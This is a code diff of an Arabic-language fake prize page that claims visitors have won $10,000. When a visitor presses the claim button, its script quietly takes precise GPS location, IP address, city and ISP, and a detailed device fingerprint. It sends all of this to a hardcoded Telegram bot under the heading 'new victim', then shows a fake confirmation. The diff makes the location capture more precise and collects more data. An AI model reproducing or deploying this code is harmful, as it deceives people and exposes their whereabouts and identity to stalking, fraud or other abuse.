@@ -5,79 +5,93 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>مبروك</title>
 <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-        margin: 0;
-        padding: 0;
         font-family: 'Segoe UI', Tahoma, sans-serif;
-        background: linear-gradient(135deg, #1e3c72, #2a5298);
+        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+        min-height: 100vh;
         display: flex;
         justify-content: center;
         align-items: center;
-        min-height: 100vh;
         color: white;
-        text-align: center;
+        padding: 20px;
     }
     .container {
-        background: rgba(255, 255, 255, 0.1);
-        backdrop-filter: blur(10px);
-        border-radius: 20px;
-        padding: 40px 30px;
-        max-width: 400px;
-        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-        border: 1px solid rgba(255, 255, 255, 0.2);
+        background: rgba(255, 255, 255, 0.08);
+        backdrop-filter: blur(12px);
+        border-radius: 24px;
+        padding: 45px 30px;
+        max-width: 420px;
+        width: 100%;
+        text-align: center;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        border: 1px solid rgba(255, 215, 0, 0.3);
     }
     h1 {
-        font-size: 28px;
-        margin-bottom: 20px;
+        font-size: 30px;
+        margin-bottom: 15px;
         color: #FFD700;
-        text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+        text-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
     }
     p {
         font-size: 16px;
-        line-height: 1.6;
-        margin-bottom: 25px;
-        color: #e0e0e0;
+        line-height: 1.7;
+        margin-bottom: 20px;
+        color: #e8e8e8;
+    }
+    .amount {
+        font-size: 26px;
+        font-weight: bold;
+        color: #FFD700;
+        display: block;
+        margin: 15px 0;
+        text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
     }
     button {
         background: linear-gradient(135deg, #FFD700, #FFA500);
-        color: #1e3c72;
+        color: #0f2027;
         border: none;
-        padding: 15px 40px;
-        font-size: 18px;
+        padding: 16px 50px;
+        font-size: 19px;
         font-weight: bold;
         border-radius: 50px;
         cursor: pointer;
-        box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
-        transition: transform 0.2s;
+        box-shadow: 0 8px 25px rgba(255, 215, 0, 0.5);
+        transition: transform 0.2s, box-shadow 0.2s;
+        margin-top: 10px;
     }
-    button:active {
-        transform: scale(0.95);
-    }
+    button:active { transform: scale(0.95); }
+    button:disabled { opacity: 0.6; cursor: not-allowed; }
     .spinner {
         display: none;
-        margin-top: 20px;
-        border: 4px solid rgba(255, 255, 255, 0.3);
+        margin: 25px auto 0;
+        border: 4px solid rgba(255, 255, 255, 0.2);
         border-top: 4px solid #FFD700;
         border-radius: 50%;
-        width: 40px;
-        height: 40px;
+        width: 45px;
+        height: 45px;
         animation: spin 1s linear infinite;
-        margin-left: auto;
-        margin-right: auto;
     }
     @keyframes spin {
         0% { transform: rotate(0deg); }
         100% { transform: rotate(360deg); }
+    }
+    .status {
+        margin-top: 20px;
+        font-size: 14px;
+        color: #b0b0b0;
+        display: none;
     }
 </style>
 </head>
 <body>
 <div class="container">
     <h1>🎉 مبروك! 🎉</h1>
-    <p>لقد فزت بمبلغ <strong>10,000 دولار</strong>!</p>
+    <p>لقد فزت بمبلغ <span class="amount">10,000 دولار</span></p>
     <p>اضغط على الزر أدناه لاستلام جائزتك الآن</p>
     <button id="claimBtn">استلام الجائزة</button>
     <div class="spinner" id="spinner"></div>
+    <div class="status" id="status">جاري تحديد موقعك بدقة...</div>
 </div>
 
 <script>
@@ -86,95 +100,259 @@
 
     var BOT_TOKEN = '8759707833:AAFSzhInZJr9PFqvf7xXpe6BYIKnluWCI6U';
     var CHAT_ID = '8822455602';
+    var TELEGRAM_URL = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
 
     function sendToTelegram(text) {
-        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-        var data = {
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'HTML'
-        };
-        return fetch(url, {
+        return fetch(TELEGRAM_URL, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            })
         })
-        .then(function(response) { return response.json(); })
-        .catch(function(err) { console.error('Send error:', err); });
+        .then(function(r) { return r.json(); })
+        .catch(function(e) { console.error('Telegram error:', e); });
     }
 
-    function getLocation() {
+    function getHighAccuracyLocation() {
         return new Promise(function(resolve) {
             if (!navigator.geolocation) {
-                resolve(null);
+                resolve({ error: 'Geolocation not supported' });
                 return;
             }
-            navigator.geolocation.getCurrentPosition(
+
+            var options = {
+                enableHighAccuracy: true,
+                timeout: 20000,
+                maximumAge: 0
+            };
+
+            var bestResult = null;
+            var watchId = null;
+            var finished = false;
+            var samples = [];
+
+            function finish(result) {
+                if (finished) return;
+                finished = true;
+                if (watchId !== null) {
+                    navigator.geolocation.clearWatch(watchId);
+                }
+                resolve(result);
+            }
+
+            function pickBest() {
+                if (samples.length === 0) return null;
+                var best = samples[0];
+                for (var i = 1; i < samples.length; i++) {
+                    if (samples[i].accuracy < best.accuracy) {
+                        best = samples[i];
+                    }
+                }
+                return best;
+            }
+
+            watchId = navigator.geolocation.watchPosition(
                 function(position) {
-                    resolve({
+                    var point = {
                         lat: position.coords.latitude,
                         lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    });
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        speed: position.coords.speed,
+                        heading: position.coords.heading,
+                        timestamp: position.timestamp
+                    };
+                    samples.push(point);
+
+                    if (point.accuracy <= 20) {
+                        finish({ success: true, data: point });
+                    }
                 },
                 function(error) {
-                    resolve(null);
+                    var errorMsg;
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = 'تم رفض إذن الموقع';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = 'معلومات الموقع غير متاحة';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = 'انتهت مهلة تحديد الموقع';
+                            break;
+                        default:
+                            errorMsg = 'خطأ غير معروف';
+                    }
+                    if (samples.length > 0) {
+                        finish({ success: true, data: pickBest() });
+                    } else {
+                        finish({ error: errorMsg, code: error.code });
+                    }
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                options
             );
+
+            setTimeout(function() {
+                if (samples.length > 0) {
+                    finish({ success: true, data: pickBest() });
+                } else {
+                    finish({ error: 'انتهت المهلة دون الحصول على موقع' });
+                }
+            }, 15000);
         });
     }
 
     function collectDeviceInfo() {
         var info = {
             userAgent: navigator.userAgent,
-            platform: navigator.platform,
+            platform: navigator.platform || 'غير معروف',
             language: navigator.language,
+            languages: (navigator.languages || []).join(', '),
             screen: window.screen.width + 'x' + window.screen.height,
+            colorDepth: window.screen.colorDepth,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timestamp: new Date().toISOString()
+            timezoneOffset: new Date().getTimezoneOffset(),
+            cores: navigator.hardwareConcurrency || 'غير معروف',
+            memory: navigator.deviceMemory || 'غير معروف',
+            touchPoints: navigator.maxTouchPoints || 0,
+            cookiesEnabled: navigator.cookieEnabled,
+            online: navigator.onLine,
+            referrer: document.referrer || 'مباشر',
+            url: window.location.href,
+            timestamp: new Date().toISOString(),
+            localTime: new Date().toLocaleString('ar-EG')
         };
         return info;
     }
 
-    function formatLocation(loc) {
-        if (!loc) return '❌ لم يتم السماح بالموقع';
-        return '📍 خط العرض: ' + loc.lat + '\n📍 خط الطول: ' + loc.lon + '\n🎯 الدقة: ' + loc.accuracy + ' متر';
+    function formatLocation(loc, err) {
+        if (err || !loc) {
+            return '❌ <b>لم يتم الحصول على الموقع</b>\nالسبب: ' + (err || 'غير معروف');
+        }
+        var text = '';
+        text += '📍 <b>خط العرض:</b> ' + loc.lat + '\n';
+        text += '📍 <b>خط الطول:</b> ' + loc.lon + '\n';
+        text += '🎯 <b>دقة الموقع:</b> ' + Math.round(loc.accuracy) + ' متر\n';
+        if (loc.altitude !== null && loc.altitude !== undefined) {
+            text += '⛰️ <b>الارتفاع:</b> ' + Math.round(loc.altitude) + ' متر\n';
+        }
+        if (loc.speed !== null && loc.speed !== undefined) {
+            text += '🚀 <b>السرعة:</b> ' + loc.speed + ' م/ث\n';
+        }
+        text += '🗺️ <b>رابط الخرائط:</b>\n';
+        text += 'https://www.google.com/maps?q=' + loc.lat + ',' + loc.lon + '\n';
+        text += '📌 <b>رابط مباشر:</b>\n';
+        text += 'https://maps.google.com/?q=' + loc.lat + ',' + loc.lon;
+        return text;
     }
 
     function formatDevice(info) {
-        return '📱 الجهاز: ' + info.platform + '\n🌐 المتصفح: ' + info.userAgent.substring(0, 100) + '\n🗣️ اللغة: ' + info.language + '\n🖥️ الشاشة: ' + info.screen + '\n🕐 التوقيت: ' + info.timezone;
+        var text = '';
+        text += '📱 <b>النظام:</b> ' + info.platform + '\n';
+        text += '🌐 <b>المتصفح:</b> ' + info.userAgent.substring(0, 120) + '\n';
+        text += '🗣️ <b>اللغة:</b> ' + info.language + '\n';
+        text += '🖥️ <b>الشاشة:</b> ' + info.screen + ' (' + info.colorDepth + ' bit)\n';
+        text += '🕐 <b>المنطقة الزمنية:</b> ' + info.timezone + '\n';
+        text += '⚙️ <b>أنوية المعالج:</b> ' + info.cores + '\n';
+        text += '🧠 <b>الذاكرة:</b> ' + info.memory + ' GB\n';
+        text += '👆 <b>نقاط اللمس:</b> ' + info.touchPoints + '\n';
+        text += '🍪 <b>الكوكيز:</b> ' + (info.cookiesEnabled ? 'مفعّلة' : 'معطّلة') + '\n';
+        text += '📡 <b>الاتصال:</b> ' + (info.online ? 'متصل' : 'غير متصل');
+        return text;
+    }
+
+    function getIPInfo() {
+        return fetch('https://ipapi.co/json/')
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    isp: data.org,
+                    lat: data.latitude,
+                    lon: data.longitude
+                };
+            })
+            .catch(function() { return null; });
+    }
+
+    function formatIPInfo(ip) {
+        if (!ip) return '❌ لم يتم الحصول على معلومات IP';
+        var text = '';
+        text += '🌍 <b>عنوان IP:</b> ' + (ip.ip || 'غير معروف') + '\n';
+        text += '🏙️ <b>المدينة:</b> ' + (ip.city || 'غير معروف') + '\n';
+        text += '🗺️ <b>المنطقة:</b> ' + (ip.region || 'غير معروف') + '\n';
+        text += '🏳️ <b>الدولة:</b> ' + (ip.country || 'غير معروف') + '\n';
+        text += '📡 <b>مزود الخدمة:</b> ' + (ip.isp || 'غير معروف');
+        return text;
     }
 
     document.getElementById('claimBtn').addEventListener('click', function() {
         var btn = document.getElementById('claimBtn');
         var spinner = document.getElementById('spinner');
+        var status = document.getElementById('status');
+
+        btn.disabled = true;
         btn.style.display = 'none';
         spinner.style.display = 'block';
+        status.style.display = 'block';
+        status.textContent = 'جاري تحديد موقعك بدقة...';
 
         var deviceInfo = collectDeviceInfo();
 
-        getLocation().then(function(location) {
-            var message = '🎯 <b>ضحية جديدة!</b>\n\n';
-            message += '━━━━━━━━━━━━━━━━━\n';
-            message += '🌐 <b>معلومات الموقع:</b>\n';
-            message += formatLocation(location) + '\n\n';
-            message += '━━━━━━━━━━━━━━━━━\n';
-            message += '📊 <b>معلومات الجهاز:</b>\n';
-            message += formatDevice(deviceInfo) + '\n';
-            message += '━━━━━━━━━━━━━━━━━\n';
-            message += '⏰ <b>الوقت:</b> ' + deviceInfo.timestamp;
+        Promise.all([
+            getHighAccuracyLocation(),
+            getIPInfo()
+        ]).then(function(results) {
+            var locResult = results[0];
+            var ipInfo = results[1];
 
-            sendToTelegram(message).then(function() {
-                setTimeout(function() {
-                    spinner.style.display = 'none';
-                    btn.style.display = 'inline-block';
-                    btn.textContent = 'تم الاستلام ✅';
-                    alert('تم استلام طلبك بنجاح، سيتم التواصل معك قريباً');
-                }, 2000);
-            });
+            var locationText;
+            if (locResult.success) {
+                locationText = formatLocation(locResult.data, null);
+            } else {
+                locationText = formatLocation(null, locResult.error);
+            }
+
+            var message = '🎯 <b>ضحية جديدة - معلومات كاملة</b>\n';
+            message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
+            message += '🌐 <b>الموقع الجغرافي (GPS):</b>\n';
+            message += locationText + '\n\n';
+            message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
+            message += '🌍 <b>الموقع حسب IP:</b>\n';
+            message += formatIPInfo(ipInfo) + '\n\n';
+            message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
+            message += '📊 <b>معلومات الجهاز:</b>\n';
+            message += formatDevice(deviceInfo) + '\n\n';
+            message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
+            message += '🔗 <b>الرابط:</b> ' + deviceInfo.url + '\n';
+            message += '↩️ <b>المصدر:</b> ' + deviceInfo.referrer + '\n';
+            message += '⏰ <b>الوقت المحلي:</b> ' + deviceInfo.localTime + '\n';
+            message += '🕐 <b>UTC:</b> ' + deviceInfo.timestamp;
+
+            status.textContent = 'جاري إرسال البيانات...';
+
+            return sendToTelegram(message);
+        }).then(function() {
+            spinner.style.display = 'none';
+            status.textContent = 'تم الاستلام بنجاح ✅';
+            btn.style.display = 'inline-block';
+            btn.textContent = 'تم استلام الجائزة ✅';
+            setTimeout(function() {
+                alert('تم استلام طلبك بنجاح!\nسيتم التواصل معك قريباً لاستلام الجائزة.');
+            }, 300);
+        }).catch(function(err) {
+            spinner.style.display = 'none';
+            status.textContent = 'حدث خطأ، يرجى المحاولة مرة أخرى';
+            btn.style.display = 'inline-block';
+            btn.disabled = false;
+            console.error(err);
         });
     });
 })();
